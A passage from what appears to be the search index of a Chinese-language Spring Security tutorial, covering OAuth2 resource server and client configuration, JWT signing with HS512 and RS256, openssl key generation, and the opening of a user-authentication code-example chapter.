JwtDecoders.fromIssuerLocation(\"http://localhost:9000\");\n\n        // \u6dfb\u52a0\u81ea\u5b9a\u4e49\u9a8c\u8bc1\u5668\n        OAuth2TokenValidator&lt;Jwt&gt; withIssuer = \n            JwtValidators.createDefaultWithIssuer(\"http://localhost:9000\");\n        OAuth2TokenValidator&lt;Jwt&gt; combinedValidator = \n            new DelegatingOAuth2TokenValidator&lt;&gt;(withIssuer, customJwtValidator);\n\n        jwtDecoder.setJwtValidator(combinedValidator);\n\n        return jwtDecoder;\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#api","title":"\u8d44\u6e90\u670d\u52a1\u5668API\u793a\u4f8b","text":"<pre><code>/**\n * \u53d7\u4fdd\u62a4\u7684API\u7aef\u70b9\n */\n@RestController\n@RequestMapping(\"/api\")\npublic class ApiController {\n\n    /**\n     * \u83b7\u53d6\u5f53\u524d\u7528\u6237\u4fe1\u606f\n     */\n    @GetMapping(\"/me\")\n    public Map&lt;String, Object&gt; getCurrentUser(@AuthenticationPrincipal Jwt jwt) {\n        Map&lt;String, Object&gt; userInfo = new HashMap&lt;&gt;();\n        userInfo.put(\"username\", jwt.getSubject());\n        userInfo.put(\"email\", jwt.getClaimAsString(\"email\"));\n        userInfo.put(\"roles\", jwt.getClaimAsStringList(\"roles\"));\n        userInfo.put(\"user_id\", jwt.getClaimAsString(\"user_id\"));\n\n        return userInfo;\n    }\n\n    /**\n     * \u9700\u8981\u7279\u5b9a\u89d2\u8272\n     */\n    @GetMapping(\"/admin/users\")\n    @PreAuthorize(\"hasRole('ADMIN')\")\n    public List&lt;User&gt; getAllUsers() {\n        return userService.findAll();\n    }\n\n    /**\n     * \u9700\u8981\u7279\u5b9ascope\n     */\n    @GetMapping(\"/data\")\n    @PreAuthorize(\"hasAuthority('SCOPE_read')\")\n    public List&lt;Data&gt; getData() {\n        return dataService.findAll();\n    }\n\n    /**\n     * \u68c0\u67e5\u81ea\u5b9a\u4e49\u58f0\u660e\n     */\n    @GetMapping(\"/department-data\")\n    public List&lt;Data&gt; getDepartmentData(@AuthenticationPrincipal Jwt jwt) {\n        String department = jwt.getClaimAsString(\"department\");\n        return dataService.findByDepartment(department);\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#oauth2_1","title":"OAuth2\u5ba2\u6237\u7aef\u914d\u7f6e","text":""},{"location":"auth/06-SpringSecurity-OAuth2/#_7","title":"\u57fa\u7840\u5ba2\u6237\u7aef\u914d\u7f6e","text":"<pre><code># application.yml\nspring:\n  security:\n    oauth2:\n      client:\n        registration:\n          # \u81ea\u5b9a\u4e49\u6388\u6743\u670d\u52a1\u5668\n          my-auth-server:\n            client-id: client-app\n            client-secret: secret\n            client-name: My App\n            scope:\n              - openid\n              - profile\n              - read\n              - write\n            authorization-grant-type: authorization_code\n            redirect-uri: \"{baseUrl}/login/oauth2/code/{registrationId}\"\n\n          # GitHub OAuth\n          github:\n            client-id: your-github-client-id\n            client-secret: your-github-client-secret\n            scope:\n              - read:user\n              - user:email\n\n          # Google OAuth\n          google:\n            client-id: your-google-client-id\n            client-secret: your-google-client-secret\n            scope:\n              - openid\n              - profile\n              - email\n\n        provider:\n          my-auth-server:\n            issuer-uri: http://localhost:9000\n            # \u6216\u624b\u52a8\u914d\u7f6e\u5404\u4e2a\u7aef\u70b9\n            # authorization-uri: http://localhost:9000/oauth2/authorize\n            # token-uri: http://localhost:9000/oauth2/token\n            # user-info-uri: http://localhost:9000/userinfo\n            # jwk-set-uri: http://localhost:9000/oauth2/jwks\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#_8","title":"\u5ba2\u6237\u7aef\u5b89\u5168\u914d\u7f6e","text":"<pre><code>/**\n * OAuth2\u5ba2\u6237\u7aef\u5b89\u5168\u914d\u7f6e\n */\n@Configuration\n@EnableWebSecurity\npublic class OAuth2ClientConfig {\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/\", \"/public/**\").permitAll()\n                .anyRequest().authenticated()\n            )\n            .oauth2Login(oauth2 -&gt; oauth2\n                .loginPage(\"/login\")\n                .defaultSuccessUrl(\"/dashboard\")\n                .userInfoEndpoint(userInfo -&gt; userInfo\n                    .userService(oauth2UserService())\n                )\n            )\n            .oauth2Client(Customizer.withDefaults());\n\n        return http.build();\n    }\n\n    /**\n     * \u81ea\u5b9a\u4e49OAuth2\u7528\u6237\u670d\u52a1\n     */\n    @Bean\n    public OAuth2UserService&lt;OAuth2UserRequest, OAuth2User&gt; oauth2UserService() {\n        DefaultOAuth2UserService delegate = new DefaultOAuth2UserService();\n\n        return userRequest -&gt; {\n            OAuth2User oauth2User = delegate.loadUser(userRequest);\n\n            // \u540c\u6b65\u7528\u6237\u5230\u672c\u5730\u6570\u636e\u5e93\n            String registrationId = userRequest.getClientRegistration().getRegistrationId();\n            syncUserToDatabase(registrationId, oauth2User);\n\n            return oauth2User;\n        };\n    }\n\n    private void syncUserToDatabase(String provider, OAuth2User oauth2User) {\n        String email = oauth2User.getAttribute(\"email\");\n        String name = oauth2User.getAttribute(\"name\");\n\n        // \u67e5\u627e\u6216\u521b\u5efa\u7528\u6237\n        User user = userRepository.findByEmail(email)\n            .orElseGet(() -&gt; {\n                User newUser = new User();\n                newUser.setEmail(email);\n                newUser.setUsername(name);\n                newUser.setProvider(provider);\n                newUser.setEnabled(true);\n                return userRepository.save(newUser);\n            });\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#oauth2api","title":"\u4f7f\u7528OAuth2\u5ba2\u6237\u7aef\u8c03\u7528API","text":"<pre><code>/**\n * \u4f7f\u7528OAuth2RestTemplate\u8c03\u7528\u53d7\u4fdd\u62a4\u7684API\n */\n@Service\npublic class ApiClientService {\n\n    @Autowired\n    private OAuth2AuthorizedClientManager authorizedClientManager;\n\n    /**\n     * \u8c03\u7528\u9700\u8981OAuth2\u8ba4\u8bc1\u7684API\n     */\n    public String callProtectedApi() {\n        // \u83b7\u53d6OAuth2 Token\n        OAuth2AuthorizeRequest authorizeRequest = OAuth2AuthorizeRequest\n            .withClientRegistrationId(\"my-auth-server\")\n            .principal(SecurityContextHolder.getContext().getAuthentication())\n            .build();\n\n        OAuth2AuthorizedClient authorizedClient = \n            authorizedClientManager.authorize(authorizeRequest);\n\n        String accessToken = authorizedClient.getAccessToken().getTokenValue();\n\n        // \u4f7f\u7528Token\u8c03\u7528API\n        RestTemplate restTemplate = new RestTemplate();\n        HttpHeaders headers = new HttpHeaders();\n        headers.setBearerAuth(accessToken);\n\n        HttpEntity&lt;String&gt; entity = new HttpEntity&lt;&gt;(headers);\n        ResponseEntity&lt;String&gt; response = restTemplate.exchange(\n            \"http://localhost:8090/api/data\",\n            HttpMethod.GET,\n            entity,\n            String.class\n        );\n\n        return response.getBody();\n    }\n\n    /**\n     * \u4f7f\u7528WebClient\uff08\u54cd\u5e94\u5f0f\uff09\n     */\n    public Mono&lt;String&gt; callProtectedApiReactive() {\n        return webClient\n            .get()\n            .uri(\"http://localhost:8090/api/data\")\n            .attributes(ServletOAuth2AuthorizedClientExchangeFilterFunction\n                .clientRegistrationId(\"my-auth-server\"))\n            .retrieve()\n            .bodyToMono(String.class);\n    }\n\n    @Bean\n    public WebClient webClient(OAuth2AuthorizedClientManager authorizedClientManager) {\n        ServletOAuth2AuthorizedClientExchangeFilterFunction oauth2Client =\n            new ServletOAuth2AuthorizedClientExchangeFilterFunction(authorizedClientManager);\n\n        return WebClient.builder()\n            .apply(oauth2Client.oauth2Configuration())\n            .build();\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#jwt-token","title":"JWT Token\u914d\u7f6e","text":""},{"location":"auth/06-SpringSecurity-OAuth2/#jwt_1","title":"JWT\u751f\u6210\u548c\u9a8c\u8bc1","text":"<pre><code>/**\n * JWT\u5de5\u5177\u7c7b\n */\n@Service\npublic class JwtService {\n\n    @Value(\"${jwt.secret}\")\n    private String secret;\n\n    @Value(\"${jwt.expiration:3600000}\")\n    private long expiration;\n\n    private Key key;\n\n    @PostConstruct\n    public void init() {\n        byte[] keyBytes = Decoders.BASE64.decode(secret);\n        this.key = Keys.hmacShaKeyFor(keyBytes);\n    }\n\n    /**\n     * \u751f\u6210JWT Token\n     */\n    public String generateToken(Authentication authentication) {\n        UserDetails userDetails = (UserDetails) authentication.getPrincipal();\n\n        Date now = new Date();\n        Date expiryDate = new Date(now.getTime() + expiration);\n\n        Map&lt;String, Object&gt; claims = new HashMap&lt;&gt;();\n        claims.put(\"username\", userDetails.getUsername());\n        claims.put(\"authorities\", userDetails.getAuthorities().stream()\n            .map(GrantedAuthority::getAuthority)\n            .collect(Collectors.toList()));\n\n        return Jwts.builder()\n            .setClaims(claims)\n            .setSubject(userDetails.getUsername())\n            .setIssuedAt(now)\n            .setExpiration(expiryDate)\n            .signWith(key, SignatureAlgorithm.HS512)\n            .compact();\n    }\n\n    /**\n     * \u4eceToken\u83b7\u53d6\u7528\u6237\u540d\n     */\n    public String getUsernameFromToken(String token) {\n        Claims claims = Jwts.parserBuilder()\n            .setSigningKey(key)\n            .build()\n            .parseClaimsJws(token)\n            .getBody();\n\n        return claims.getSubject();\n    }\n\n    /**\n     * \u9a8c\u8bc1Token\n     */\n    public boolean validateToken(String token) {\n        try {\n            Jwts.parserBuilder()\n                .setSigningKey(key)\n                .build()\n                .parseClaimsJws(token);\n            return true;\n        } catch (JwtException | IllegalArgumentException e) {\n            return false;\n        }\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#rs256","title":"RS256\u7b97\u6cd5\uff08\u975e\u5bf9\u79f0\u52a0\u5bc6\uff09","text":"<pre><code>/**\n * \u4f7f\u7528RSA\u5bc6\u94a5\u5bf9\u8fdb\u884cJWT\u7b7e\u540d\n */\n@Configuration\npublic class JwtRSAConfig {\n\n    @Value(\"${jwt.private-key}\")\n    private RSAPrivateKey privateKey;\n\n    @Value(\"${jwt.public-key}\")\n    private RSAPublicKey publicKey;\n\n    /**\n     * JWT\u7f16\u7801\u5668\uff08\u7528\u4e8e\u751f\u6210Token\uff09\n     */\n    @Bean\n    public JwtEncoder jwtEncoder() {\n        JWK jwk = new RSAKey.Builder(publicKey)\n            .privateKey(privateKey)\n            .build();\n        JWKSource&lt;SecurityContext&gt; jwks = new ImmutableJWKSet&lt;&gt;(new JWKSet(jwk));\n        return new NimbusJwtEncoder(jwks);\n    }\n\n    /**\n     * JWT\u89e3\u7801\u5668\uff08\u7528\u4e8e\u9a8c\u8bc1Token\uff09\n     */\n    @Bean\n    public JwtDecoder jwtDecoder() {\n        return NimbusJwtDecoder.withPublicKey(publicKey).build();\n    }\n\n    /**\n     * \u751f\u6210Token\n     */\n    public String createToken(Authentication authentication) {\n        Instant now = Instant.now();\n\n        JwtClaimsSet claims = JwtClaimsSet.builder()\n            .issuer(\"self\")\n            .issuedAt(now)\n            .expiresAt(now.plus(1, ChronoUnit.HOURS))\n            .subject(authentication.getName())\n            .claim(\"scope\", authentication.getAuthorities().stream()\n                .map(GrantedAuthority::getAuthority)\n                .collect(Collectors.joining(\" \")))\n            .build();\n\n        return jwtEncoder().encode(JwtEncoderParameters.from(claims)).getTokenValue();\n    }\n}\n</code></pre> <p>\u751f\u6210RSA\u5bc6\u94a5\u5bf9\uff1a</p> <pre><code># \u751f\u6210\u79c1\u94a5\nopenssl genrsa -out private.pem 2048\n\n# \u4ece\u79c1\u94a5\u751f\u6210\u516c\u94a5\nopenssl rsa -in private.pem -pubout -out public.pem\n\n# \u8f6c\u6362\u4e3aPKCS8\u683c\u5f0f\uff08Java\u9700\u8981\uff09\nopenssl pkcs8 -topk8 -inform PEM -in private.pem -out private_key.pem -nocrypt\n</code></pre> <p>\u914d\u7f6e\u6587\u4ef6\uff1a</p> <pre><code>jwt:\n  private-key: classpath:private_key.pem\n  public-key: classpath:public.pem\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#oauth2spring-security","title":"OAuth2\u4e0eSpring Security\u96c6\u6210","text":""},{"location":"auth/06-SpringSecurity-OAuth2/#_9","title":"\u7edf\u4e00\u8ba4\u8bc1\u5165\u53e3","text":"<pre><code>/**\n * \u540c\u65f6\u652f\u6301OAuth2\u548c\u672c\u5730\u8ba4\u8bc1\n */\n@Configuration\n@EnableWebSecurity\npublic class UnifiedAuthConfig {\n\n    @Autowired\n    private UserDetailsService userDetailsService;\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/\", \"/login\", \"/oauth2/**\").permitAll()\n                .anyRequest().authenticated()\n            )\n\n            // \u8868\u5355\u767b\u5f55\uff08\u672c\u5730\u7528\u6237\uff09\n            .formLogin(form -&gt; form\n                .loginPage(\"/login\")\n                .defaultSuccessUrl(\"/dashboard\")\n                .permitAll()\n            )\n\n            // OAuth2\u767b\u5f55\uff08\u7b2c\u4e09\u65b9\u7528\u6237\uff09\n            .oauth2Login(oauth2 -&gt; oauth2\n                .loginPage(\"/login\")\n                .defaultSuccessUrl(\"/dashboard\")\n            )\n\n            // \u8d44\u6e90\u670d\u52a1\u5668\uff08JWT\u9a8c\u8bc1\uff09\n            .oauth2ResourceServer(oauth2 -&gt; oauth2\n                .jwt(Customizer.withDefaults())\n            );\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#_10","title":"\u7edf\u4e00\u7528\u6237\u4fe1\u606f","text":"<pre><code>/**\n * \u7edf\u4e00\u7684\u7528\u6237\u4fe1\u606f\u63a5\u53e3\n */\npublic interface UnifiedUser {\n    String getUsername();\n    String getEmail();\n    Collection&lt;? extends GrantedAuthority&gt; getAuthorities();\n}\n\n/**\n * \u672c\u5730\u7528\u6237\n */\npublic class LocalUser implements UnifiedUser, UserDetails {\n    // UserDetails\u5b9e\u73b0...\n}\n\n/**\n * OAuth2\u7528\u6237\u9002\u914d\u5668\n */\npublic class OAuth2UserAdapter implements UnifiedUser {\n\n    private final OAuth2User oauth2User;\n\n    public OAuth2UserAdapter(OAuth2User oauth2User) {\n        this.oauth2User = oauth2User;\n    }\n\n    @Override\n    public String getUsername() {\n        return oauth2User.getAttribute(\"name\");\n    }\n\n    @Override\n    public String getEmail() {\n        return oauth2User.getAttribute(\"email\");\n    }\n\n    @Override\n    public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {\n        return oauth2User.getAuthorities();\n    }\n}\n\n/**\n * \u83b7\u53d6\u5f53\u524d\u7528\u6237\u7684\u5de5\u5177\u7c7b\n */\n@Component\npublic class CurrentUserService {\n\n    public UnifiedUser getCurrentUser() {\n        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n\n        if (authentication == null) {\n            return null;\n        }\n\n        Object principal = authentication.getPrincipal();\n\n        if (principal instanceof UserDetails) {\n            return (LocalUser) principal;\n        } else if (principal instanceof OAuth2User) {\n            return new OAuth2UserAdapter((OAuth2User) principal);\n        } else if (principal instanceof Jwt) {\n            return new JwtUserAdapter((Jwt) principal);\n        }\n\n        return null;\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#_11","title":"\u5b9e\u6218\u6848\u4f8b","text":""},{"location":"auth/06-SpringSecurity-OAuth2/#_12","title":"\u5b8c\u6574\u7684\u5fae\u670d\u52a1\u8ba4\u8bc1\u67b6\u6784","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Frontend (SPA)  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n         \u2502 OAuth2 Login / JWT\n         \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        API Gateway (\u8d44\u6e90\u670d\u52a1\u5668)                 \u2502\n\u2502  \u2022 JWT\u9a8c\u8bc1                                     \u2502\n\u2502  \u2022 \u8def\u7531\u8f6c\u53d1                                     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n    \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502         \u2502            \u2502            \u2502\n\u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u25bc\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510\n\u2502 User  \u2502 \u2502Order \u2502   \u2502Product \u2502  \u2502Payment \u2502\n\u2502Service\u2502 \u2502Service\u2502   \u2502Service \u2502  \u2502Service \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         (\u5fae\u670d\u52a1 - \u90fd\u662f\u8d44\u6e90\u670d\u52a1\u5668)\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Authorization Server        \u2502\n\u2502  \u2022 \u7528\u6237\u8ba4\u8bc1                   \u2502\n\u2502  \u2022 Token\u9881\u53d1                  \u2502\n\u2502  \u2022 \u7528\u6237\u7ba1\u7406                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>API Gateway\u914d\u7f6e\uff1a</p> <pre><code>/**\n * API\u7f51\u5173 - \u8d44\u6e90\u670d\u52a1\u5668\u914d\u7f6e\n */\n@Configuration\npublic class GatewaySecurityConfig {\n\n    @Bean\n    public SecurityWebFilterChain securityWebFilterChain(ServerHttpSecurity http) {\n        http\n            .authorizeExchange(exchanges -&gt; exchanges\n                .pathMatchers(\"/api/public/**\").permitAll()\n                .pathMatchers(\"/api/admin/**\").hasRole(\"ADMIN\")\n                .anyExchange().authenticated()\n            )\n            .oauth2ResourceServer(oauth2 -&gt; oauth2\n                .jwt(Customizer.withDefaults())\n            );\n\n        return http.build();\n    }\n}\n</code></pre> <p>\u5fae\u670d\u52a1\u95f4\u8c03\u7528\uff08Client Credentials\u6a21\u5f0f\uff09\uff1a</p> <pre><code>/**\n * \u670d\u52a1\u95f4\u8c03\u7528 - \u4f7f\u7528Client Credentials\n */\n@Service\npublic class OrderService {\n\n    @Autowired\n    private WebClient webClient;\n\n    @Autowired\n    private OAuth2AuthorizedClientManager authorizedClientManager;\n\n    public Mono&lt;Product&gt; getProduct(String productId) {\n        return webClient\n            .get()\n            .uri(\"http://product-service/api/products/{id}\", productId)\n            .attributes(ServletOAuth2AuthorizedClientExchangeFilterFunction\n                .clientRegistrationId(\"product-service-client\"))\n            .retrieve()\n            .bodyToMono(Product.class);\n    }\n}\n\n/**\n * OAuth2\u914d\u7f6e\n */\n@Configuration\npublic class OAuth2Config {\n\n    @Bean\n    public OAuth2AuthorizedClientManager authorizedClientManager(\n            ClientRegistrationRepository clientRegistrationRepository,\n            OAuth2AuthorizedClientRepository authorizedClientRepository) {\n\n        OAuth2AuthorizedClientProvider authorizedClientProvider =\n            OAuth2AuthorizedClientProviderBuilder.builder()\n                .authorizationCode()\n                .refreshToken()\n                .clientCredentials()  // \u670d\u52a1\u95f4\u8c03\u7528\n                .build();\n\n        DefaultOAuth2AuthorizedClientManager authorizedClientManager =\n            new DefaultOAuth2AuthorizedClientManager(\n                clientRegistrationRepository,\n                authorizedClientRepository);\n\n        authorizedClientManager.setAuthorizedClientProvider(authorizedClientProvider);\n\n        return authorizedClientManager;\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#_13","title":"\u603b\u7ed3","text":"<p>\u672c\u7ae0\u4ecb\u7ecd\u4e86Spring Security OAuth2\u7684\u5b8c\u6574\u96c6\u6210\uff1a</p> <ol> <li>\u6388\u6743\u670d\u52a1\u5668\uff1aToken\u9881\u53d1\u3001\u5ba2\u6237\u7aef\u7ba1\u7406\u3001\u81ea\u5b9a\u4e49Token</li> <li>\u8d44\u6e90\u670d\u52a1\u5668\uff1aJWT\u9a8c\u8bc1\u3001\u6743\u9650\u68c0\u67e5\u3001\u81ea\u5b9a\u4e49\u9a8c\u8bc1</li> <li>OAuth2\u5ba2\u6237\u7aef\uff1a\u7b2c\u4e09\u65b9\u767b\u5f55\u3001API\u8c03\u7528</li> <li>JWT\u914d\u7f6e\uff1a\u5bf9\u79f0/\u975e\u5bf9\u79f0\u52a0\u5bc6\u3001Token\u751f\u6210\u548c\u9a8c\u8bc1</li> <li>\u5fae\u670d\u52a1\u67b6\u6784\uff1a\u5b8c\u6574\u7684\u8ba4\u8bc1\u6388\u6743\u89e3\u51b3\u65b9\u6848</li> </ol> <p>\u6700\u4f73\u5b9e\u8df5\uff1a - \u4f7f\u7528\u6388\u6743\u7801+PKCE\u6a21\u5f0f\uff08\u524d\u7aef\u5e94\u7528\uff09 - \u4f7f\u7528Client Credentials\u6a21\u5f0f\uff08\u670d\u52a1\u95f4\u8c03\u7528\uff09 - JWT\u4f7f\u7528RS256\u7b97\u6cd5\uff08\u975e\u5bf9\u79f0\u52a0\u5bc6\uff09 - Token\u6709\u6548\u671f\u8bbe\u7f6e\u5408\u7406\uff08Access Token\u77ed\u671f\uff0cRefresh Token\u957f\u671f\uff09 - \u5b9e\u73b0Token\u5237\u65b0\u673a\u5236</p> <p>\u7ee7\u7eed\u5b66\u4e60\uff1a - \u4e0a\u4e00\u7ae0\uff1aSpring Security\u5b9e\u6218\u914d\u7f6e - \u4e0b\u4e00\u7ae0\uff1a\u4ee3\u7801\u793a\u4f8b\u96c6</p>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/","title":"\u4ee3\u7801\u793a\u4f8b\u96c6","text":""},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_2","title":"\u76ee\u5f55","text":"<ul> <li>\u57fa\u7840\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1</li> <li>JWT Token\u5b9e\u73b0</li> <li>OAuth2\u6388\u6743\u7801\u6a21\u5f0f</li> <li>\u5fae\u670d\u52a1\u8ba4\u8bc1\u67b6\u6784</li> <li>\u524d\u540e\u7aef\u5206\u79bb\u8ba4\u8bc1\u65b9\u6848</li> </ul>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_3","title":"\u57fa\u7840\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1","text":""},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_4","title":"\u5b8c\u6574\u9879\u76ee\u7ed3\u6784","text":"<pre><code>user-auth-demo/\n\u251c\u2500\u2500 src/main/java/com/example/auth/\n\u2502   \u251c\u2500\u2500 config/\n\u2502   \u2502   \u2514\u2500\u2500 SecurityConfig.java\n\u2502   \u251c\u2500\u2500 controller/\n\u2502   \u2502   \u251c\u2500\u2500 AuthController.java\n\u2502   \u2502   \u2514\u2500\u2500 UserController.java\n\u2502   \u251c\u2500\u2500 entity/\n\u2502   \u2502   \u251c\u2500\u2500 User.java\n\u2502   \u2502   \u2514\u2500\u2500 Role.java\n\u2502   \u251c\u2500\u2500 repository/\n\u2502   \u2502   \u251c\u2500\u2500 UserRepository.java\n\u2502   \u2502   \u2514\u2500\u2500 RoleRepository.java\n\u2502   \u251c\u2500\u2500 service/\n\u2502   \u2502   \u251c\u2500\u2500 UserService.java\n\u2502   \u2502   \u2514\u2500\u2500 CustomUserDetailsService.java\n\u2502   \u2514\u2500\u2500 dto/\n\u2502       \u251c\u2500\u2500 RegisterRequest.java\n\u2502       \u2514\u2500\u2500 LoginResponse.java\n\u2514\u2500\u2500 src/main/resources/\n    \u251c\u2500\u2500 application.yml\n    \u2514\u2500\u2500 schema.sql\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_5","title":"\u5b9e\u4f53\u7c7b","text":"<pre><code>/**\n * \u7528\u6237\u5b9e\u4f53\n */\n@Entity\n@Table(name = \"users\")\n@Data\npublic class User {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n\n    @Column(unique = true, nullable = false)\n    private String username;\n\n    @Column(nullable = false)\n    private String password;\n\n    @Column(unique = true, nullable = false)\n    private String email;\n\n    private boolean enabled = true;\n\n    private boolean accountNonExpired = true;\n\n    private boolean accountNonLocked = true;\n\n    private boolean credentialsNonExpired = true;\n\n    @ManyToMany(fetch = FetchType.EAGER)\n    @JoinTable(\n        name = \"user_roles\",\n        joinColumns = @JoinColumn(name = \"user_id\"),\n        inverseJoinColumns = @JoinColumn(name = \"role_id\")\n    )\n    private Set&lt;Role&gt; roles = new HashSet&lt;&gt;();\n\n    @CreationTimestamp\n    private LocalDateTime createdAt;\n\n    @UpdateTimestamp\n    private LocalDateTime updatedAt;\n}\n\n/**\n * \u89d2\u8272\u5b9e\u4f53\n */\n@Entity\n@Table(name = \"roles\")\n@Data\npublic class Role {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n\n    @Column(unique = true, nullable = false)\n    private String name;  // ADMIN, USER, MANAGER\n\n    private String description;\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#repository","title":"Repository","text":"<pre><code>/**\n * \u7528\u6237\u4ed3\u5e93\n */\npublic interface UserRepository extends JpaRepository&lt;User, Long&gt; {\n\n    Optional&lt;User&gt; findByUsername(String username);\n\n    Optional&lt;User&gt; findByEmail(String email);\n\n    Boolean existsByUsername(String username);\n\n    Boolean existsByEmail(String email);\n}\n\n/**\n * \u89d2\u8272\u4ed3\u5e93\n */\npublic interface RoleRepository extends JpaRepository&lt;Role, Long&gt; {\n\n    Optional&lt;Role&gt; findByName(String name);\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#userdetailsservice","title":"UserDetailsService\u5b9e\u73b0","text":"<pre><code>/**\n * \u81ea\u5b9a\u4e49UserDetailsService\n */\n@Service\n@Transactional(readOnly = true)\npublic class CustomUserDetailsService implements UserDetailsService {\n\n    @Autowired\n    private UserRepository userRepository;\n\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n        User user = userRepository.findByUsername(username)\n            .orElseThrow(() -&gt; new UsernameNotFoundException(\"\u7528\u6237\u4e0d\u5b58\u5728: \" + username));\n\n        return org.springframework.security.core.userdetails.User.builder()\n            .username(user.getUsername())\n            .password(user.getPassword())\n            .authorities(getAuthorities(user))\n            .accountExpired(!user.isAccountNonExpired())\n            .accountLocked(!user.isAccountNonLocked())\n            .credentialsExpired(!user.isCredentialsNonExpired())\n            .disabled(!user.isEnabled())\n            .build();\n    }\n\n    private Collection&lt;? extends GrantedAuthority&gt; getAuthorities(User user) {\n        return user.getRoles().stream()\n            .map(role -&gt; new SimpleGrantedAuthority(\"ROLE_\" + role.getName()))\n            .collect(Collectors.toSet());\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#service","title":"Service\u5c42","text":"<pre><code>/**\n * \u7528\u6237\u670d\u52a1\n */\n@Service\n@Transactional\npublic class UserService {\n\n    @Autowired\n    private UserRepository userRepository;\n\n    @Autowired\n    private RoleRepository roleRepository;\n\n    @Autowired\n    private PasswordEncoder passwordEncoder;\n\n    /**\n     * \u6ce8\u518c\u65b0\u7528\u6237\n     */\n    public User registerUser(RegisterRequest request) {\n        // \u68c0\u67e5\u7528\u6237\u540d\u662f\u5426\u5df2\u5b58\u5728\n        if (userRepository.existsByUsername(request.getUsername())) {\n            throw new IllegalArgumentException(\"\u7528\u6237\u540d\u5df2\u5b58\u5728\");\n        }\n\n        // \u68c0\u67e5\u90ae\u7bb1\u662f\u5426\u5df2\u5b58\u5728\n        